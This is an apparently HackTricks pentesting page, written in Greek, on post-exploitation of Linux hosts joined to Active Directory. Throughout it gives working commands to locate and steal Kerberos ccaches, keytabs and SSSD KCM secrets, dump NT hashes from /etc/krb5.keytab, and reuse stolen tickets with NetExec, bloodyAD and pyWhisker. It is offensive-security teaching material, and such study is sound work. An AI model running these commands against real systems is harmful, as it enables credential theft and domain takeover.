# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Ένα Linux machine μπορεί επίσης να υπάρχει μέσα σε ένα Active Directory περιβάλλον.

Ένα Linux machine μέσα σε ένα AD μπορεί να **αποθηκεύει τοπικά υλικό Kerberos**: user ccaches, machine/service keytabs και secrets που διαχειρίζεται το SSSD. Αυτά τα artefacts συνήθως μπορούν να επαναχρησιμοποιηθούν όπως οποιοδήποτε άλλο Kerberos credential. Για να διαβάσετε τα περισσότερα από αυτά, θα πρέπει συνήθως να είστε ο user owner του ticket ή **root** στο machine.

## Enumeration

### AD enumeration from linux

Αν έχετε πρόσβαση σε ένα AD από Linux (ή bash σε Windows), μπορείτε να δοκιμάσετε το [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) για να κάνετε enumeration στο AD.

Μπορείτε επίσης να δείτε την παρακάτω σελίδα για να μάθετε **άλλους τρόπους για enumeration του AD από Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

Το FreeIPA είναι μια open-source **εναλλακτική** στο Microsoft Windows **Active Directory**, κυρίως για **Unix** περιβάλλοντα. Συνδυάζει ένα πλήρες **LDAP directory** με ένα MIT **Kerberos** Key Distribution Center για διαχείριση παρόμοια με αυτή του Active Directory. Χρησιμοποιώντας το Dogtag **Certificate System** για τη διαχείριση CA & RA certificates, υποστηρίζει **multi-factor** authentication, συμπεριλαμβανομένων των smartcards. Το SSSD είναι ενσωματωμένο για Unix authentication processes. Μάθετε περισσότερα σχετικά με αυτό στη διεύθυνση:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Πριν ασχοληθείτε με tickets, εντοπίστε **πώς έγινε το join του host στο AD** και **πού αποθηκεύεται πραγματικά το υλικό Kerberos**. Σε σύγχρονα Linux hosts αυτό συνήθως γίνεται με `realmd` + `adcli` + `sssd`, και όχι μόνο σε flat files στο `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Αυτό σας ενημερώνει γρήγορα αν ο host εμπιστεύεται το AD, αν το SSSD αποθηκεύει προσωρινά identities ή tickets και αν **machine/service keytabs** ή **KCM secrets** είναι διαθέσιμα για abuse.

## Playing with tickets

### Pass The Ticket

Σε αυτήν τη σελίδα θα βρείτε διαφορετικές τοποθεσίες όπου μπορείτε να **βρείτε kerberos tickets μέσα σε έναν linux host**. Στην επόμενη σελίδα μπορείτε να μάθετε πώς να μετατρέπετε αυτά τα CCache ticket formats σε Kirbi (το format που χρειάζεστε για χρήση στα Windows) και επίσης πώς να πραγματοποιείτε επίθεση PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Αν θέλετε τα **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, κ.λπ.), δείτε τη dedicated σελίδα:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

Τα αρχεία CCACHE είναι binary formats για **αποθήκευση Kerberos credentials**. Το `FILE:/tmp/krb5cc_%{uid}` εξακολουθεί να είναι συνηθισμένο, αλλά τα σύγχρονα Linux deployments χρησιμοποιούν επίσης `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ή `KCM:%{uid}`. Ελέγξτε τη μεταβλητή περιβάλλοντος **`KRB5CCNAME`** και τη ρύθμιση `default_ccache_name` προτού θεωρήσετε ότι τα tickets βρίσκονται στο `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Επαναχρησιμοποίηση CCACHE ticket από keyring

**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.

Για τη ρύθμιση και τη χρήση αυτού του tool, ακολουθούνται τα παρακάτω βήματα:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Αυτή η διαδικασία θα προσπαθήσει να κάνει inject σε διάφορα sessions, υποδεικνύοντας την επιτυχία αποθηκεύοντας τα extracted tickets στο `/tmp`, με naming convention `__krb_UID.ccache`.

### Επαναχρησιμοποίηση CCACHE tickets από SSSD KCM

Το SSSD διατηρεί ένα αντίγραφο της database στη διαδρομή `/var/lib/sss/secrets/secrets.ldb`. Το αντίστοιχο key αποθηκεύεται ως hidden file στη διαδρομή `/var/lib/sss/secrets/.secrets.mkey`. Από προεπιλογή, το key είναι αναγνώσιμο μόνο αν διαθέτετε permissions **root**.

Η εκτέλεση του **`SSSDKCMExtractor`** με τις παραμέτρους --database και --key θα κάνει parse τη database και θα **κάνει decrypt τα secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Το **credential cache Kerberos blob μπορεί να μετατραπεί σε usable Kerberos CCache** αρχείο, το οποίο μπορεί να δοθεί στα Mimikatz/Rubeus.

### Γρήγορο keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Εξαγωγή λογαριασμών από το `/etc/krb5.keytab`

Τα κλειδιά λογαριασμών υπηρεσιών, απαραίτητα για υπηρεσίες που εκτελούνται με δικαιώματα root, αποθηκεύονται με ασφάλεια σε αρχεία **`/etc/krb5.keytab`**. Αυτά τα κλειδιά, τα οποία λειτουργούν σαν κωδικοί πρόσβασης για υπηρεσίες, απαιτούν αυστηρή εμπιστευτικότητα.

Για την επιθεώρηση των περιεχομένων του αρχείου keytab, μπορεί να χρησιμοποιηθεί το **`klist`**. Στο Linux, η εντολή `klist -k -K -e` εμφανίζει τα principals, τους αριθμούς έκδοσης κλειδιών, τους τύπους κρυπτογράφησης και το ακατέργαστο υλικό κλειδιού. Αν ο τύπος κλειδιού είναι **23 / RC4-HMAC**, η τιμή του κλειδιού είναι επίσης το **NT hash** του συγκεκριμένου principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Για χρήστες Linux, το **`KeyTabExtract`** προσφέρει λειτουργικότητα για την εξαγωγή του RC4 HMAC hash, το οποίο μπορεί να αξιοποιηθεί για επαναχρησιμοποίηση NTLM hash. Σημειώστε ότι αυτό βοηθά μόνο όταν το keytab εξακολουθεί να περιέχει υλικό **etype 23 / RC4-HMAC**. Σε περιβάλλοντα **AES-only** ενδέχεται να μην λάβετε επαναχρησιμοποιήσιμο NT hash, αλλά μπορείτε να πραγματοποιήσετε απευθείας authentication με το keytab μέσω Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Στο macOS, το **`bifrost`** λειτουργεί ως εργαλείο ανάλυσης αρχείων keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Χρησιμοποιώντας τις εξαγόμενες πληροφορίες λογαριασμών και hash, μπορούν να πραγματοποιηθούν συνδέσεις σε servers με εργαλεία όπως το **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Επαναχρησιμοποίηση του machine account από το `/etc/krb5.keytab`

Σε συστήματα που έχουν γίνει joined μέσω `realmd`/`adcli`/`sssd`, το `/etc/krb5.keytab` συνήθως περιέχει τον **λογαριασμό υπολογιστή** και ένα ή περισσότερα **host/service principals**. Αν έχεις **root**, μην κάνεις απλώς dump το αρχείο: χρησιμοποίησε ένα από τα principals που εμφανίζονται με την εντολή `klist -k` για να ζητήσεις ένα TGT και να λειτουργήσεις ως ο ίδιος ο Linux host.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν το ίδιο το **computer object** διαθέτει delegated δικαιώματα στο AD ή όταν ο host επιτρέπεται να ανακτήσει άλλα secrets, όπως ένα **gMSA**.

### Επαναχρησιμοποίηση κλεμμένου Kerberos υλικού με Linux-first AD tooling

Μόλις αποκτήσετε ένα έγκυρο `ccache` ή ένα usable keytab, μπορείτε να εκτελείτε ενέργειες εναντίον του AD **απευθείας από Linux**, χωρίς να μετατρέψετε πρώτα τα πάντα σε Windows formats. Πολλά σύγχρονα εργαλεία υποστηρίζουν εγγενώς τα `KRB5CCNAME` / Kerberos auth:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Αυτό αποτελεί μια καλή γέφυρα μεταξύ του **Linux post-exploitation** και της **κατάχρησης αντικειμένων AD**. Για τις ίδιες τις διαδρομές κατάχρησης σε επίπεδο αντικειμένων, δείτε:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Τεχνουργήματα Linux gMSA / Managed Service Account

Οι πρόσφατες αναπτύξεις Linux μπορούν να χρησιμοποιούν **Managed Service Accounts** απευθείας από το AD. Στην πράξη, αυτό σημαίνει ότι, μετά την παραβίαση ενός Linux server, ενδέχεται να βρείτε όχι μόνο το host keytab, αλλά και **service-specific keytabs** που δημιουργήθηκαν από ένα gMSA. Συνήθη σημεία ελέγχου είναι το `/etc/gmsad.conf`, αρχεία ρυθμίσεων ειδικά για την ανάπτυξη και επιπλέον αρχεία `*.keytab` κάτω από το `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Αυτό σας παρέχει μια επαναχρησιμοποιήσιμη ταυτότητα Kerberos για τα SPNs που είναι συνδεδεμένα με αυτό το gMSA **χωρίς να αγγίζετε κανένα Windows endpoint**. Για **domain-side** κατάχρηση gMSA/dMSA μετά την απόκτηση υψηλότερων δικαιωμάτων στο AD, δείτε:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Αναφορές

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
